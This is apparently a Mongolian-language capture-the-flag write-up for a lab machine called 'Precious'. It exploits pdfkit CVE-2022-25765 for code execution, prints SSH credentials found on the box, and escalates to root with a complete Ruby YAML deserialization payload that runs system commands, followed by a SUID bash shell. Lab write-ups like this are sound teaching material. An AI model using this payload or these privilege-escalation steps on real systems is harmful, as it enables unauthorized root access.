# Precious - YAML RCE Deserialized PE

22, 80 порт нээлттэй.

[image]

Web to pdf болгох зорилготой.

Өөр дээрээ apache2 сервер ажиллуулан дараах вэбийг pdf болгосон.

[image]

pdfkit v0.8.6 хувилбартай ruby сан

[image]

CVE-2022-25765 өртөмтгий байна.

[image]

RCE ХИЙЖ БАЙНА

[image]

DONE

[image]

Бид нэвтрэх credentials-ийг олсон тул SSH-ээр нэвтэрж орсон.

```
henry:Q3c1AqGHtoI0aXAYFH
```

## Sudo shell escape Privilege escalation

[image]

Ер нь бол sudo root эрхээр /opt/dependencies.rb-ийг ажиллуулна гэсэн үг л дээ. Гэхдээ доторх агуулгыг унших хэрэгтэй.

dependencies.yml файлыг ажиллуулна гэж байгаа болохоор writable directory дотор RUBY YAML LOAD DESERIALIZATION attack хийнэ.

[image]

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

/dev/shm дотор dependencies.yml файлаа бичсэн байгаа одоо ажилуулцгаая

[image]

Сайн харвал id коммандыг ажиллуулсан байгааг харж болно.

[image]

/bin/bash-д SUID тохируулж өгсөнөөр exploit маань амжилттай болох болно.

[image]

EXPLOITED

[image]
